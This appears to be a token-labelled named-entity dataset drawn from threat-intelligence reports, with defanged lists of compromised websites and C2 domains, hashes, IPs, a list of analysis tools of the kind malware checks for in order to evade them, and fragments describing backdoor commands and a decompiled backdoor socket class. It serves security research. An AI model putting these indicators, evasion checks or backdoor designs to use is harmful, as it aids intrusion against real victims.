hxxp://cafawelding[.]co.za/font-awesome/db_template.php B-url.unknown
hxxp://apalawyers.pt//db_template.php B-url.unknown
hxxp://www.edesignz[.]co.za//db_template.php B-url.unknown
hxxp://centuryacademy[.]co.za/css/db_template.php B-url.unknown
hxxps://ambyenta.hr//db_template.php B-url.unknown
hxxp://ceramica[.]co.za//db_template.php B-url.unknown
hxxp://www.alfredoposada[.]com//db_template.php B-url.unknown
hxxp://anastasovsworkshop[.]com/wp-includes/db_template.php B-url.unknown
hxxp://allisonplumbing[.]com/wp-includes/db_template.php B-url.unknown
hxxp://eastrandmotorlab[.]co.za/fleet/db_template.php B-url.unknown
hxxp://angelsongroup[.]com/wp-includes/db_template.php B-url.unknown
hxxp://www.mikimaths[.]com//db_template.php B-url.unknown
hxxp://hjb-racing[.]co.za/htdocs/db_template.php B-url.unknown
hxxp://anotherpartofme[.]com/wp-includes/db_template.php B-url.unknown
hxxp://www.andreabelfi[.]com//db_template.php B-url.unknown
hxxp://www.iancullen[.]co.za//db_template.php B-url.unknown
hxxp://alaskamaterials[.]com//db_template.php B-url.unknown
hxxp://jeanetteproperties[.]co.za//db_template.php B-url.unknown
hxxp://www.digitalmedia[.]co.za//db_template.php B-url.unknown
hxxp://www.rejoicetheatre[.]com//db_template.php B-url.unknown
hxxp://www.rejoicetheatre[.]com//db_template.php B-url.unknown
hxxps://alterwebhost[.]com//db_template.php B-url.unknown
hxxp://bc-u[.]co[.]uk//db_template.php B-url.unknown
hxxp://dpscdgkhan.edu[.]pk/shopping/db_template.php B-url.unknown
hxxp://edgeforensic[.]co.za//db_template.php B-url.unknown
hxxp://willpowerpos[.]co.za//db_template.php B-url.unknown
hxxp://antrismode[.]com/wp-includes/db_template.php B-url.unknown
hxxp://colenesphotography[.]co.za/modules/db_template.php B-url.unknown
hxxp://anthaigroup.vn//db_template.php B-url.unknown
hxxps://alphainvestors[.]com.au//db_template.php B-url.unknown
hxxps://aliart[.]nl//db_template.php B-url.unknown
hxxps://allmantravel[.]com/thumbs/db_template.php B-url.unknown
hxxp://fbrvolume[.]co.za//db_template.php B-url.unknown
hxxp://amordegato[.]es/storefront/db_template.php B-url.unknown
hxxp://agylub[.]com//db_template.php B-url.unknown
hxxp://www.khotsonglodge.co.ls//db_template.php B-url.unknown
hxxp://ampli5yd[.]com//db_template.php B-url.unknown
hxxps://animeok[.]co.il//db_template.php B-url.unknown
hxxps://arbeidsrechtcentrum[.]nl//db_template.php B-url.unknown
hxxp://erniecommunications[.]co.za/js/db_template.php B-url.unknown
hxxp://promechtransport[.]co.za/scripts/db_template.php B-url.unknown
hxxp://centuriongsd[.]co.za//db_template.php B-url.unknown
hxxp://www.agencesylvieleclerc[.]com//db_template.php B-url.unknown
hxxp://delcom[.]co.za//db_template.php B-url.unknown
hxxps://aleoestudio[.]com/gallonature/db_template.php B-url.unknown
hxxp://oftheearthphotography[.]com/www/db_template.php B-url.unknown
hxxp://h-dubepromotions[.]co.za//db_template.php B-url.unknown
hxxp://www.alessioborzuola[.]com/downloads/db_template.php B-url.unknown
hxxp://crystaltidings[.]co.za//db_template.php B-url.unknown
hxxp://funeralbusinesssolution[.]com/email_template/db_template.php B-url.unknown
hxxp://funisalodge[.]co.za/data1/db_template.php B-url.unknown
hxxp://experttutors[.]co.za//db_template.php B-url.unknown
hxxps://www[.]cartridgecave[.]co.za//db_template.php B-url.unknown
hxxp://ecs-consult[.]com//db_template.php B-url.unknown
hxxp://www.animationinisrael[.]org/tmp_images/db_template.php B-url.unknown
hxxp://gideonitesprojects[.]com//db_template.php B-url.unknown
hxxp://hybridauto[.]co.za/photography/db_template.php B-url.unknown
hxxp://africanpixels.zar.cc//db_template.php B-url.unknown
hxxp://ryanchristiefurniture[.]co.za//db_template.php B-url.unknown
hxxp://evansmokaba[.]com/evansmokaba[.]com/thabiso/db_template.php B-url.unknown
hxxp://almeriahotelja[.]com/dk/db_template.php B-url.unknown
hxxp://al3abflash[.]biz//db_template.php B-url.unknown
hxxp://al3abflash[.]biz//db_template.php B-url.unknown
hxxp://www.fun4kidz[.]co.za//db_template.php B-url.unknown
hxxp://alsharhanstore[.]com//db_template.php B-url.unknown
hxxp://www[.]infratechconsulting[.]com//db_template.php B-url.unknown
hxxp://algihad[.]com/assets/db_template.php B-url.unknown
hxxp://americanwestmedia[.]com//db_template.php B-url.unknown
hxxp://charliewestsecurity[.]co.za//db_template.php B-url.unknown
hxxp://beehiveholdingszar[.]co.za//db_template.php B-url.unknown
hxxp://analyticalfootball[.]com//db_template.php B-url.unknown
hxxp://apiiination[.]com/leadership/db_template.php B-url.unknown
hxxps://ahelicoptermom[.]com/wp-includes/db_template.php B-url.unknown
hxxp://servicebox[.]co.za//db_template.php B-url.unknown
hxxp://globalelectricalandconstruction[.]co.za/wpscripts/db_template.php B-url.unknown
hxxps://aquo[.]in//db_template.php B-url.unknown
hxxps://www.alfransia[.]com/wp-admin/db_template.php B-url.unknown
hxxp://www.icsswaziland[.]com//db_template.php B-url.unknown
hxxp://aiko.pro//db_template.php B-url.unknown
hxxps://alceharfield[.]com//db_template.php B-url.unknown
hxxp://indocraft[.]co.za/test/db_template.php B-url.unknown
hxxp://allegiancesecurity[.]org//db_template.php B-url.unknown
hxxp://sullivanprimary[.]co.za//db_template.php B-url.unknown
hxxp://www.apmequestrian[.]com//db_template.php B-url.unknown
hxxps://alphawaves[.]org/wp-admin/db_template.php B-url.unknown
hxxp://www.alexandrasternin[.]com/illustration/db_template.php B-url.unknown
hxxp://www.daleth[.]co.za//db_template.php B-url.unknown
hxxp://jwseshowe[.]co.za/assets/db_template.php B-url.unknown
hxxp://winagainstebola[.]com//db_template.php B-url.unknown
hxxp://anubandh[.]in//db_template.php B-url.unknown
hxxp://www.alexanderhomestead[.]com//db_template.php B-url.unknown
hxxp://alfatek-intelligence[.]com//db_template.php B-url.unknown
hxxp://www.aprendiendoencasa[.]com/wp-includes/db_template.php B-url.unknown
hxxp://alorabrownies[.]com/wp-admin/db_template.php B-url.unknown
hxxp://andrasadam[.]com/tothildiko/wp-includes/db_template.php B-url.unknown
hxxp://cazochem[.]co.za/cazochem/db_template.php B-url.unknown
hxxp://debnoch[.]com/image/db_template.php B-url.unknown
hxxp://hmholdings360[.]co.za//db_template.php B-url.unknown
hxxp://iinvest4u[.]co.za//db_template.php B-url.unknown
hxxp://burgercoetzeeattorneys[.]co.za//db_template.php B-url.unknown
hxxp://anngrigphoto[.]com//db_template.php B-url.unknown
hxxp://alchemistasonida[.]com//db_template.php B-url.unknown
hxxp://anahera[.]biz/admin/db_template.php B-url.unknown
hxxp://h-u-i[.]co.za/heiren/db_template.php B-url.unknown
hxxp://h-u-i[.]co.za/heiren/db_template.php B-url.unknown
hxxp://insta-art[.]co.za//db_template.php B-url.unknown
hxxp://muallematsela[.]com//db_template.php B-url.unknown
hxxp://aguasdecastilla[.]com/uploads/db_template.php B-url.unknown
hxxp://www.arabgamenetwork[.]com//db_template.php B-url.unknown
hxxps://arhiepiscopiabucurestilor[.]ro/templates/db_template.php B-url.unknown
hxxp://amruthavana[.]com/blog/db_template.php B-url.unknown
hxxp://digitalblue[.]co.za//db_template.php B-url.unknown
hxxps://www.alvarezarquitectos[.]com//db_template.php B-url.unknown
hxxp://buboobioinnovations[.]co.za/wpimages/db_template.php B-url.unknown
hxxp://andrewsbisom[.]com//db_template.php B-url.unknown
hxxp://www.m-3[.]co.za//db_template.php B-url.unknown
hxxp://beesrenovations[.]co.za/images/db_template.php B-url.unknown
hxxps://www.apliety[.]co.il/wp-includes/db_template.php B-url.unknown
hxxp://alchamelup[.]org/htdocs/db_template.php B-url.unknown
hxxp://benonicoc[.]co.za/resources/db_template.php B-url.unknown
hxxps://al-mostakbl[.]com//db_template.php B-url.unknown
hxxp://alchimiegrafiche[.]net/bbdelteatro/db_template.php B-url.unknown
hxxp://andrespazsoldan[.]com//db_template.php B-url.unknown
hxxp://in2accounting[.]co.za//db_template.php B-url.unknown
hxxp://aipa[.]ca//db_template.php B-url.unknown
hxxp://alphabee.fund/PHPMailer_5.2.0/db_template.php B-url.unknown
hxxp://arabsdeals[.]com//db_template.php B-url.unknown
hxxps://archiotronic[.]com/wp-includes/db_template.php B-url.unknown
hxxp://capewindstrading[.]co.za//db_template.php B-url.unknown
hxxps://althurayaa[.]com//db_template.php B-url.unknown
hxxp://jhphotoedits[.]co.za//db_template.php B-url.unknown
hxxp://cloudhub.co.ls/modules/db_template.php B-url.unknown
hxxp://apironco[.]com/wp-includes/db_template.php B-url.unknown
hxxp://digital-cameras-south-africa[.]co.za/script/db_template.php B-url.unknown
hxxp://ahmadhasanat[.]com//db_template.php B-url.unknown
hxxp://alexrocchi[.]com//db_template.php B-url.unknown
hxxp://aljaadi[.]com//db_template.php B-url.unknown
hxxps://www.engeltjieakademie[.]co.za//db_template.php B-url.unknown
hxxp://annabelle[.]nl/next/db_template.php B-url.unknown
hxxp://juniorad[.]co.za/vendor/db_template.php B-url.unknown
hxxp://animationpulse[.]net//db_template.php B-url.unknown
hxxp://angloglot[.]com//db_template.php B-url.unknown
hxxp://agricolavicuna.cl//db_template.php B-url.unknown
hxxp://alexelgy[.]com/allaccess/db_template.php B-url.unknown
hxxp://www.centreforgovernance[.]uk//db_template.php B-url.unknown
hxxp://www.aliandconsulting[.]com//db_template.php B-url.unknown
hxxp://balaateen[.]co.za/less/db_template.php B-url.unknown
hxxp://aleksicdunja[.]com//db_template.php B-url.unknown
hxxp://arestihome[.]com//db_template.php B-url.unknown
hxxp://am1int.fcomet[.]com/wp1/db_template.php B-url.unknown
hxxp://anet-international-group[.]com/shop/db_template.php B-url.unknown
hxxp://courtesydriving[.]co.za/js/db_template.php B-url.unknown
hxxp://annaplebanek[.]com//db_template.php B-url.unknown
hxxp://agencijazemil[.]com//db_template.php B-url.unknown
hxxp://airminumtiro[.]com//db_template.php B-url.unknown
hxxp://www.androidwikihow[.]com//db_template.php B-url.unknown
hxxp://alisabyfinna[.]com//db_template.php B-url.unknown
hxxp://rma-law[.]co.za//db_template.php B-url.unknown
hxxp://amari[.]ro/components/db_template.php B-url.unknown
hxxp://anxiousandunstoppable[.]com//db_template.php B-url.unknown
hxxp://www.buhlebayoacademy[.]com//db_template.php B-url.unknown
hxxp://arabellajo[.]com/wp/wp-includes/db_template.php B-url.unknown
hxxp://blackthorn[.]co.za//db_template.php B-url.unknown
hxxp://alaqaba[.]com/dnsarabia[.]com/db_template.php B-url.unknown
hxxp://airesis.blog/wp-admin/db_template.php B-url.unknown
hxxp://www.aptibet[.]org//db_template.php B-url.unknown
hxxp://alecattic[.]com/wp-includes/db_template.php B-url.unknown
hxxp://anglero[.]com//db_template.php B-url.unknown
hxxp://getabletravel[.]co.za/wpscripts/db_template.php B-url.unknown
hxxp://www.allwestdental[.]com/wp-includes/db_template.php B-url.unknown
hxxp://printernet[.]co.za//db_template.php B-url.unknown
hxxp://genesisbs[.]co.za//db_template.php B-url.unknown
hxxp://allsporthealthandfitness[.]com//db_template.php B-url.unknown
hxxp://www.humorcarbons[.]com//db_template.php B-url.unknown
hxxp://intelligentprotection[.]co.za//db_template.php B-url.unknown
hxxp://amazethings[.]com//db_template.php B-url.unknown
hxxp://incoso[.]co.za/images/db_template.php B-url.unknown
hxxp://www.antoanetapalikarska[.]com//db_template.php B-url.unknown
hxxps://www.alteaparadise[.]com/wp-includes/db_template.php B-url.unknown
hxxp://amirmenahem[.]com//db_template.php B-url.unknown
hxxp://isound[.]co.za//db_template.php B-url.unknown
hxxp://www.alestilorachel[.]com//db_template.php B-url.unknown
hxxp://alcfm[.]net/wp-admin/db_template.php B-url.unknown
hxxp://www.acer-parts[.]co.za//db_template.php B-url.unknown
hxxp://www.gsmmid[.]com//db_template.php B-url.unknown
hxxp://skhaleni[.]co.za//db_template.php B-url.unknown
hxxps://amiici.vision//db_template.php B-url.unknown
hxxps://andihaas[.]at/wp-includes/db_template.php B-url.unknown
hxxp://www.albertaprimebeef[.]com//db_template.php B-url.unknown
hxxps://www.appster[.]it/wp-includes/db_template.php B-url.unknown
hxxp://amofoundation[.]org/wp-includes/db_template.php B-url.unknown
hxxp://iqra[.]co.za/pub/db_template.php B-url.unknown
hxxp://thecompasssolutions[.]co.za//db_template.php B-url.unknown
hxxp://archwaycarpetscrm[.]co[.]uk//db_template.php B-url.unknown
hxxp://iggleconsulting[.]com//db_template.php B-url.unknown
hxxps://angel-blanco[.]net/wp-includes/db_template.php B-url.unknown
hxxps://anotherdayinparadise[.]ca//db_template.php B-url.unknown
hxxp://www.bitp[.]co.za//db_template.php B-url.unknown
hxxp://cupboardcure[.]co.za/vendor/db_template.php B-url.unknown
hxxp://all2wedding[.]com/wp-includes/db_template.php B-url.unknown
hxxp://allianz[.]com.pe/wp-admin/db_template.php B-url.unknown
hxxp://amiehepperlin[.]com//db_template.php B-url.unknown
hxxps://www.amighini[.]it/webservice/db_template.php B-url.unknown
hxxp://broken-arrow[.]co.za//db_template.php B-url.unknown
hxxp://www.ihlosiqs-pm[.]co.za//db_template.php B-url.unknown
hxxp://alisimple[.]si/wp-includes/db_template.php B-url.unknown
hxxp://allthat[.]social//db_template.php B-url.unknown
hxxp://allthat[.]social//db_template.php B-url.unknown
hxxp://www.amphibiblechurch[.]com//db_template.php B-url.unknown
hxxp://bestencouragementwords[.]com//db_template.php B-url.unknown
hxxp://alayhamtechnologies[.]com//db_template.php B-url.unknown
hxxps://alaskanharvestseafood[.]com/backup/db_template.php B-url.unknown
hxxps://www.air-mag[.]ro//db_template.php B-url.unknown
hxxp://get-paid-for-online-survey[.]com//db_template.php B-url.unknown
hxxp://www.antc[.]ch/wp-includes/db_template.php B-url.unknown
hxxp://firstchoiceproperties[.]co.za//db_template.php B-url.unknown
hxxp://habibtextiles[.]pk//db_template.php B-url.unknown
hxxp://fsproperties[.]co.za/engine1/db_template.php B-url.unknown
hxxp://diegemmerkat[.]co.za//db_template.php B-url.unknown
hxxp://molepetravel.co.ls//db_template.php B-url.unknown
hxxp://mmetl[.]co.za//db_template.php B-url.unknown
hxxp://altrablog[.]com//db_template.php B-url.unknown
hxxp://abrahamseed[.]co.za//db_template.php B-url.unknown
hxxp://www.amerindgen[.]com/author/admin1/db_template.php B-url.unknown
hxxp://altcoinaddict[.]com//db_template.php B-url.unknown
hxxp://iiee.edu[.]pk//db_template.php B-url.unknown
hxxp://cmhts[.]co.za/resources/db_template.php B-url.unknown
hxxp://domesticguardians[.]co.za/Banner/db_template.php B-url.unknown
hxxps://amishcountryfurnishings[.]com//db_template.php B-url.unknown
hxxps://allday[.]gr//db_template.php B-url.unknown
hxxp://www.alinn-u-yin[.]com//db_template.php B-url.unknown
hxxps://www.allin-chain[.]com//db_template.php B-url.unknown
hxxps://www.anatapackaging[.]com/vendors/db_template.php B-url.unknown
hxxp://alexcelts[.]com/wp/db_template.php B-url.unknown
hxxp://www.allstylus[.]com.br//db_template.php B-url.unknown
hxxp://www.algom-law[.]com//db_template.php B-url.unknown
hxxp://ambiances-toiles[.]fr//db_template.php B-url.unknown
win32_remote O
win64_remote64 O
ollydbg O
ProcessHacker O
tcpview O
autoruns O
autorunsc O
filemon O
procmon O
regmon O
regmon O
procexp O
idaq O
idaq64 O
ImmunityDebugger O
Wireshark O
dumpcap O
HookExplorer O
ImportREC O
PETools O
LordPE O
dumpcap O
SysInspector O
proc_analyzer O
sysAnalyzer O
sniff_hit O
windbg O
joeboxcontrol O
joeboxserver O
This O
entry O
was O
posted O
on O
Tue O
Mar O
13 O
12:15 O
EDT O
2018 O
and O
filed O
under O
Yogesh O
Londhe O
, O
Dileep O
Kumar O
Jallepalli O
, O
Ben O
Read O
, O
Iran O
, O
Spear O
Phishing B-malware.drop
, O
and O
Sudeep O
Singh O
. O

adineohler[.]com B-url.unknown
aisicoin[.]com B-url.unknown
alicervois[.]com B-url.unknown
anessallie[.]com B-url.unknown
antenham[.]com B-url.unknown
arinaurna[.]com B-url.unknown
arkoimmerma[.]com B-url.unknown
aulolloy[.]com B-url.unknown
avidilleneu[.]com B-url.unknown
avidsontre[.]com B-url.unknown
aximilian[.]com B-url.unknown
biasatts[.]com B-url.unknown
braydenhateaub[.]com B-url.unknown
carosseda[.]com B-url.unknown
chascloud[.]com B-url.unknown
dreyoddu[.]com B-url.unknown
dwarduong[.]com B-url.unknown
eckenbaue[.]com B-url.unknown
eighrimeau[.]com B-url.unknown
errellawle[.]com B-url.unknown
erstin[.]com B-url.unknown
frahreiner[.]com B-url.unknown
hieryells[.]com B-url.unknown
hristophe[.]com B-url.unknown
ichardt[.]com B-url.unknown
icmannaws[.]com B-url.unknown
iecopeland[.]com B-url.unknown
irkaimboeuf[.]com B-url.unknown
jamedalue[.]com B-url.unknown
jamyer[.]com B-url.unknown
jeanessbinder[.]com B-url.unknown
jeffreyue[.]com B-url.unknown
keoucha[.]com B-url.unknown
laudiaouc[.]com B-url.unknown
lbertussbau[.]com B-url.unknown
loridanase[.]com B-url.unknown
marrmann[.]com B-url.unknown
meroque[.]com B-url.unknown
moureuxacv[.]com B-url.unknown
myolton[.]com B-url.unknown
nasahlaes[.]com B-url.unknown
ntjeilliams[.]com B-url.unknown
omasicase[.]com B-url.unknown
onnaha[.]com B-url.unknown
onteagle[.]com B-url.unknown
orinneamoure[.]com B-url.unknown
orresto[.]com B-url.unknown
orrislark[.]com B-url.unknown
rackerasr[.]com B-url.unknown
rcuselynac[.]com B-url.unknown
sanauer[.]com B-url.unknown
stopherau[.]com B-url.unknown
tefanie[.]com B-url.unknown
tefanortin[.]com B-url.unknown
tephens[.]com B-url.unknown
traveroyce[.]com B-url.unknown
tsworthoa[.]com B-url.unknown
ucaargo[.]com B-url.unknown
ucairtz[.]com B-url.unknown
urnage[.]com B-url.unknown
venionne[.]com B-url.unknown
virginiaar[.]com B-url.unknown

During O
our O
research O
, O
we O
found O
that O
IHU O
was O
also O
very O
interested O
in O
Spanish O
higher O
educational O
establishments O
and O
specific O
government O
departments O
. O

The O
main O
difference O
with O
the O
other O
malware O
is O
the O
C2 O
server O
. O

/iec/ O
From O
April O
2016 O
until O
at O
least O
February O
2017 O
, O
attackers O
have O
been O
spreading O
malware O
via O
fake O
Facebook O
profiles O
and O
pages O
, O
breached O
websites O
, O
self-hosted O
and O
cloud O
based O
websites O
. O

In O
addition O
, O
rtniczw.sys O
used O
a O
registry O
key O
and O
configuration O
data O
block O
that O
was O
not O
used O
in O
Stuxnet B-malware.backdoor
. O

The O
0day O
vulnerability O
was O
fixed O
and O
it O
was O
named O
CVE-2018-8174 B-malware.unknown
. O

Similar O
to O
the O
previously O
analyzed O
sample O
, O
it O
is O
also O
using O
image O
steganography O
and O
memory O
reflection O
loading O
. O

Leveraging O
its O
global O
network O
of O
cybersecurity O
labs O
, O
deep O
industry O
understanding O
across O
client O
value O
chains O
and O
services O
that O
span O
the O
security O
lifecycle O
, O
Accenture O
protects O
organization O
's O
valuable O
assets O
, O
end-to-end O
. O

Knowledge O
of O
the O
tactics O
, O
techniques O
, O
and O
procedures O
( O
TTPs O
) O
used O
by O
the O
operators O
behind O
this O
campaign O
helps O
to O
better O
inform O
detection O
and O
response O
to O
attacks O
by O
this O
threat O
group O
. O

Conclusion O
9 O
. O

Many O
of O
the O
threat O
actors O
in O
the O
Middle O
East O
that O
we O
're O
familiar O
with O
have O
extremely O
volatile O
IP O
hosting O
, O
owing O
to O
the O
fact O
that O
the O
infrastructure O
is O
likely O
to O
be O
hosted O
on O
their O
own O
networks O
. O

The O
response O
string O
is O
decoded O
and O
parsed O
for O
the O
following O
commands O
: O
'm O
' O
: O
executes O
a O
shell O
command O
' O
u O
' O
: O
uploads O
a O
file O
to O
the O
victim O
( O
downloads O
a O
file O
from O
the O
victim O
's O
perspective O
) O
'd O
' O
: O
downloads O
a O
file O
to O
the O
attacker O
( O
uploads O
a O
file O
from O
the O
victim O
's O
perspective O
) O
' O
R O
' O
: O
removes O
the O
auto­run O
registry O
value O
These O
commands O
are O
referenced O
in O
the O
code O
in O
this O
order O
, O
and O
when O
said O
aloud O
it O
sounds O
like O
' O
mutter B-malware.backdoor
' O
, O
hence O
the O
name O
chosen O
for O
the O
malware O
. O

The O
series O
will O
culminate O
with O
a O
CrowdCast O
in O
April O
2014 O
detailing O
a O
case O
study O
of O
the O
incident O
response O
investigation O
conducted O
to O
identify O
these O
web O
shells B-malware.backdoor
. O

Other O
mitigation O
strategies O
include O
a O
multilayered O
approach O
to O
securing O
the O
organization O
's O
perimeter O
, O
which O
includes O
hardening O
the O
endpoints O
and O
employing O
application O
control O
to O
help O
prevent O
malicious O
applications O
and O
processes O
from O
being O
executed O
. O

Following O
this O
, O
a O
POST O
request O
is O
sent O
to O
the O
C O
& O
C O
every O
once O
in O
a O
while O
( O
/api/serv/requests/ B-url.cncsvr
[ I-url.cncsvr
base64_fingerprint I-url.cncsvr
] O
) O
, O
and O
in O
turn O
, O
the O
C O
& O
C O
sends O
back O
a O
configuration O
file O
that O
turns O
on O
specific O
functionalities O
of O
the O
malware O
. O

Logging O
details O
about O
the O
system O
. O

The O
list O
of O
indicators O
of O
compromise O
, O
which O
includes O
Trend O
Micro O
's O
corresponding O
detections O
and O
solutions O
, O
is O
in O
this O
appendix O
. O

a O
global O
corporation O
based O
in O
Asia O
with O
the O
goal O
of O
stealing O
proprietary O
business O
information O
. O

The O
problem O
is O
not O
that O
traditional O
methods O
do O
not O
work O
. O

Analysts O
noting O
the O
similarity O
did O
not O
have O
to O
visit O
the O
street O
to O
determine O
that O
it O
was O
unlikely O
that O
they O
each O
resided O
in O
different O
homes O
on O
the O
same O
street O
. O

The O
Dropper O
, O
pretending O
to O
be O
a O
Pokemon O
Go O
app O
, O
adds O
an O
icon O
to O
the O
phone O
dashboard O
. O

EC5B360F5FF6251A08A14A2E95C4CAA4 B-hash
hint1.zapto.org B-url.cncsvr

The O
main O
CozyDuke B-malware.drop
dropper O
, O
used O
for O
infecting O
hosts O
with O
CozyDuke B-malware.drop
, O
begins O
by O
checking O
whether O
the O
victim O
has O
an O
anti-virus O
product O
installed O
. O

The O
malware O
spreads O
very O
fast O
using O
Telegram O
messenger O
application O
in O
smartphones O
, O
targeting O
high-profile O
Libyan B-malware.infosteal
influential O
and O
political O
figures O
. O

Another O
interesting O
result O
that O
came O
from O
the O
research O
concerns O
the O
samples O
attributed O
to O
Advanced O
Persistent O
Threat O
( O
APT B-malware.unknown
) O
campaigns O
. O

Below O
screen O
shot O
shows O
the O
network O
traffic O
generated O
as O
a O
result O
of O
macro O
code O
executing O
the O
PowerShell O
script O
. O

These O
are O
not O
conducted O
through O
separate O
attacks O
; O
rather O
, O
they O
comprise O
of O
a O
series O
of O
attempts O
over O
time O
to O
get O
deeper O
and O
deeper O
into O
a O
target O
's O
network O
. O

Figure O
7 O
: O
The O
components O
dropped O
in O
the O
% O
Application O
Data O
% O
\Microsoft\CLR\* O
directory O

getInstalledApps O
] O

We O
acquired O
multiple O
versions O
of O
DUBNIUM B-malware.drop
droppers O
through O
our O
daily O
operations O
. O

HBGary O
's O
Digital O
DNATM O
database O
not O
only O
codifi O
es O
the O
behavior O
of O
software O
, O
but O
also O
the O
coding O
idioms O
, O
algorithms O
, O
and O
methods O
of O
individual O
developers O
. O

The O
malware O
has O
been O
in O
development O
since O
at O
least O
2006 O
. O

% O
USERHASH O
% O
- O
Hash O
of O
the O
login O
name O
% O
USER O
% O
- O
Login O
name O
% O
SEQ O
% O
- O
Assumed O
to O
be O
the O
sequence O
number O
of O
dump O
files O
created O
by O
Babar B-malware.drop
% O
KID O
% O
- O
Assumed O
to O
be O
the O
ID O
of O
a O
subsequently O
infected O
process O
% O
ID O
% O
- O
Value O
retrieved O
from O
hardcoded O
configuration O
% O
SELFDIR O
% O
- O
Executable O
directory O
% O
SELF O
% O
- O
Executable O
name O
Values O
retrieved O
from O
Windows O
environment O
: O
% O
APPDATA O
% O
% O
USERPROFILE O
% O
% O
WINDIR O
% O
% O
COMMON_APPDATA O
% O
% O
ALLUSERPROFILE O
% O
% O
CommonProgramFiles O
% O

At O
the O
time O
of O
this O
writing O
, O
it O
is O
unclear O
to O
what O
degree O
and O
for O
how O
long O
this O
specific O
application O
was O
utilized O
by O
the O
entirety O
of O
the O
Ukrainian O
Artillery O
Forces O
. O

// O
destructor O
class O
BD_SOCK O
// O
members O
~BD_SOCK O
( O
) O
; O
BD_SOCK* O
Copy O
( O
bool O
fCopySocket O
) O
; O
// O
duplicate O
object O
// O
member O
variables O
DWORD O
dwLastError O
; O
char O
szHostName O
[ O
256 O
] O
; O
DWORD O
dwListeningPortNumber O
; O
SOCKET O
sktRemoteEndpoint O
; O
SOCKET O
hListeningSocket O
; O
class O
PCC_SOCK O
: O
BD_SOCK O
~PCC_SOCK O
( O
) O
; O
// O
destructor O
// O
virtual O
members O
PCC_SOCK O
* O
Copy O
( O
bool O
fCopyListeningSocket O
) O
; O
SOCKET O
ConnectToRemoteEndpointByNameAndAttemptChannelByPOSTOrHandshake O
( O
int O
a2 O
, O
int O
a3 O
, O
int O
a4 O
, O
int O
a5 O
, O
char O
*pszHostname O
, O
int O
wHostPort O
) O
; O
SOCKET O
ConnectToRemoteEndpointByNameAndHandshake O
( O
char O
*pszHostname O
, O
int O
wHostPort O
) O
; O
SOCKET O
ConnectToRemoteEndpointByNameAndPerformPOSTLogin O
( O
char O
*pszHostname O
, O
int O
wHostPort O
) O
; O
SOCKET O
WaitForClient O
( O
) O
; O
int O
SendEncodedData O
( O
int O
dwPktType O
, O
void O
*payload O
, O
size_t O
dwPayloadSize O
) O
; O
int O
RecvEncodeData O
( O
DWORD O
*pdwPktType O
, O
char O
**pvPayload O
, O
DWORD O
*pdwPayloadSize O
) O
; O
void O
freeMemory O
( O
void O
*pMemory O
) O
; O
// O
member O
functions O
int O
SendVictimInfo O
( O
) O
; O
int O
WaitForReadEvent O
( O
int O
dwTimeout O
) O
; O
int O
SOCKSConnectWithRandomLocalPort O
( O
int O
dwEndPointIP O
, O
u_short O
hostshort O
) O
; O
int O
BindToRandomPort O
( O
SOCKET O
s O
) O
; O
int O
SendBuffer O
( O
SOCKET O
s O
, O
char O
*buf O
, O
int O
len O
) O
; O
SOCKET O
AcceptIncomingConnection O
( O
) O
; O
SOCKET O
ConnectToRemoteEndpointByName O
( O
char O
*szHostName O
, O
int O
hostshort O
) O
; O
SOCKET O
ConnectToRemoteEndpoint O
( O
int O
dwIP O
, O
u_short O
wPort O
) O
; O
int O
ReadFromRemoteEndpoint O
( O
char O
*buf O
, O
int O
len O
) O
; O
SOCKET O
NewSocket O
( O
) O
; O
int O
BindSocket O
( O
SOCKET O
s O
, O
int O
dwLowPort O
, O
int O
dwHighPort O
) O
; O
int O
SendAuthenicationResponse O
( O
void O
*pvResponse O
) O
; O
int O
SendHTTP200ResponseIfViaHeaderFound O
( O
char O
*Str O
) O
; O
// O
member O
variables O
char O
compressionBuffer O
[ O
65536 O
] O
; O

root9B O
analysts O
began O
to O
dissect O
the O
data O
at O
hand O
to O
identify O
common O
tactics O
, O
techniques O
, O
and O
procedures O
used O
by O
the O
adversaries O
which O
could O
provide O
further O
information O
about O
the O
planned O
hack O
, O
including O
information O
about O
potential O
attack O
vectors O
. O

Comparisons O
to O
other O
modules O
quickly O
shows O
a O
delineation O
in O
other O
Sofacy O
efforts O
. O

Analysis O
of O
the O
file O
with O
MD5 O
Hash O
: O
B9AF5F5FD434A65D7AA1B55F5441C90A B-hash

Since O
2014 O
, O
the O
Inception B-malware.backdoor
Framework I-malware.backdoor
has O
steadily O
changed O
its O
tools O
and O
techniques O
. O

The O
core O
of O
the O
loop O
that O
scrambles O
up O
the O
substitution O
table O
is O
as O
follows O
: O

As O
time O
has O
gone O
by O
, O
the O
group O
has O
become O
ever O
more O
secretive O
, O
hiding O
behind O
an O
increasingly O
complex O
framework O
of O
proxies O
and O
cloud O
services O
. O

We O
still O
consider O
it O
as O
a O
series O
of O
attack O
incidents O
based O
on O
other O
comprehensive O
analysis O
. O

2014 O
Vietnam O
Network O
Security O
2014 O
Germany O
Manufacturing O
2015 O
Vietnam O
Media O
2016 O
Philippines O
Consumer O
products O
2016 O
Vietnam O
Banking O
KOMPROGO O
SOUNDBITE O
BEACON O
2016 O
Philippines O
Technology O
Infrastructure O
WINDSHIELD O
2016 O
China O
Hospitality O
2016 O
Vietnam O
Media O
2016 O
United O
States O
Consumer O
Products O
2017 O
United O
Kingdom O
Consulting O
PHOREAL O
BEACON O
SOUNDBITE O
SOUNDBITE O
Table O
1 O
: O
APT32 B-malware.infosteal
Private O
Sector O
Targeting O
Identified O
by O
FireEye O
In O
addition O
to O
focused O
targeting O
of O
the O
private O
sector O
with O
ties O
to O
Vietnam O
, O
APT32 B-malware.infosteal
has O
also O
targeted O
foreign O
governments O
, O
as O
well O
as O
Vietnamese O
dissidents O
and O
journalists O
since O
at O
least O
2013 O
. O

The O
' O
123456 O
' O
cluster O
also O
contains O
spam O
in O
the O
English O
language O
, O
leveraging O
the O
recent O
tragedy O
in O
Kenya O
as O
a O
lure O
. O

' O
Nakashima O
, O
Ellen O
. O

The O
domain O
was O
previously O
hosted O
on O
an O
Iranian O
IP O
5.144.130[.]23 B-ip.unknown
and O
since O
April O
22 O
, O
2017 O
, O
points O
at O
German O
VPS O
IP O
144.76.87[.]86 B-ip.unknown
. O

If O
the O
target O
filename O
is O
incorrect O
or O
invalid O
the O
plugin O
file O
is O
deleted O
and O
the O
registry O
value O
is O
erased O
. O

When O
clicked O
, O
it O
would O
redirect O
to O

Root O
CA O
Certificate O
password O
( O
' O
f*ck O
your O
mom123 O
' O
was O
in O
Mandarin O
) O
We O
also O
suspect O
most O
of O
the O
victims O
are O
located O
in O
China O
, O
because O
of O
the O
following O
findings:.Searches O
for O
